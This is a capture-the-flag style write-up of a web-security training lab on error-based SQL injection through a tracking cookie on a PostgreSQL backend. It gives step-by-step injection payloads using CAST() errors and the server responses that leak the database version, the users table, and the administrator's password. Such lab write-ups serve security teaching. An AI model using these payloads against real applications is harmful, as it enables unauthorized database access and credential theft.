## Visible error-based SQL injection

This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.

The database contains a different table called users, with columns called username and password. To solve the lab, find a way to leak the password for the administrator user, then log in to their account.


## Notes

- `/login`
- `/filter?category=parameter`
- Vulnerable cookie: `TrackingId`

## Resume

1. Trigger a SQL error
2. Confirm PostgreSQL backend
3. Exploit error-based SQLi with `CAST()`
4. Extract usernames and passwords
5. Log in as administrator

## Solve

Trigger a SQL syntax error by adding a quote inside the `TrackingId` cookie:

```http
GET /filter?category=Pets HTTP/2
Host: 0a51001904c9fbf682fbfbd900f300ac.web-security-academy.net
Cookie: TrackingId=AIzaFYf2J3qw16Eo'; session=VjAQwn01KEJ765jT1Putt4pGJqrVkunV
```

The application returns the following PostgreSQL error:

```text
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'AIzaFYf2J3qw16Eo''. Expected char
```

This confirms that the cookie is vulnerable to SQL injection.

Retrieve the PostgreSQL version banner using an invalid integer cast:

```sql
' AND (SELECT version())::int=1-- -
```

Response:

```text
ERROR: invalid input syntax for type integer:
"PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit"
```

Trying to cast an entire table produces another useful error:

```sql
' AND CAST((SELECT * FROM users) AS int)=1-- -
```

Response:

```text
ERROR: subquery must return only one column
```

This confirms the existence of the `users` table.

Extract the first username:

```sql
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- -
```

Response:

```text
ERROR: invalid input syntax for type integer: "administrator"
```

Extract the first password:

```sql
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- -
```

Response:

```text
ERROR: invalid input syntax for type integer: "ui00w36ei3vvq8gzszii"
```

Credentials :

```text
administrator:ui00w36ei3vvq8gzszii
```